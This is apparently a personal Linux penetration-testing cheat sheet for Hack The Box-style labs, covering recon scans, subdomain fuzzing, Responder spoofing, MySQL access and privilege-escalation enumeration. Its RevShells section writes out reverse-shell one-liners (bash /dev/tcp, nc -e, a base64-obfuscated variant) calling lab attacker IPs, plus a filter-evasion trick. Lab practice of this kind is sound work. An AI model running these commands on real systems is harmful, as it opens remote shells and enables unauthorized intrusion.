# Linux CheatSheet
## General

```bash
mkdir nmap
nmap -A -T4 -v -oN nmap/initial $IP 
sudo masscan -p1-65535,U:1-65535 $IP --rate=1000 -e tun0 -oL nmap/masscan

hosts
#alias for 'sudo nano /etc/hosts'

dirsearch -u $URL
gobuster dir -u $URL -w /home/kali/directory-list-2.3-medium.txt

ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://devvortex.htb -H "Host:FUZZ.devvortex.htb" -mc 200,204,301,307,401,403,405,500
#fuzzes subdomains

wpscan --url <url> -v -e 

sudo responder -wA -I tun0 -v 
#Spoofs every server imaginable to get info on connection attempts

```
Always google open ports, not just services shown/guessed by nmap

.dockerenv in / means you're in a docker container
${IFS} can be used in place of whitespace when no whitespace allowed
jd-gui used to decompile jar files
gitdump used to dump .git directories

## MySQL

```bash
mysql -u <username> -p 
#connect to mysql database on machine
show databases;
use <databasename>;
show tables;

```

## RevShells

```bash
bash -i >& /dev/tcp/10.10.14.205/8888 0>&1
nc 10.10.14.54 8888 -e bash

echo "bash -i >& /dev/tcp/10.10.14.205/8888 0>&1" | base64
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41NC84ODg4IDA+JjE=" | base64 -d | bash

which python
which python3

python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

stty raw -echo #with ctrl-z/backgrounded
fg
export TERM=xterm
reset
```

/home/kali/php-reverse-shell.php is php reverse shell that can be uploaded to php server

## PrivEsc

```bash
sudo -l 
#shows any commands to be run as sudo by user

chmod +x pspy && ./pspy 
#sees all commands run, can find cron run as sudo etc

/home/kali/linpeas.sh 
#good tool for PE enum

env 
#shows env variables, could have creds

uname -a 
#shows linux build, could be vuln

ldd --version
#shows GLIBC version, could be vuln (loonytoonables)
env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=`printf '%08192x' 1`" /usr/bin/su --help
#checks for loonytoonables vuln, if returns Segmentation fault (core dumped)

ps aux

find . -type f -name "*.txt"
#find all files with extension in current dir

find / -perm -u=s -type f 2>/dev/null 
#finds suid bit

cd /var/mail && cd /var/spool/mail
#check for mail

```

look in all interesting folders, .git, .config, /var/www, /, .local
check /var/www, use ls -la. .env is common php password storage thingie

## Web

https://beautifier.io/ - Use detect packers & obfuscators
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
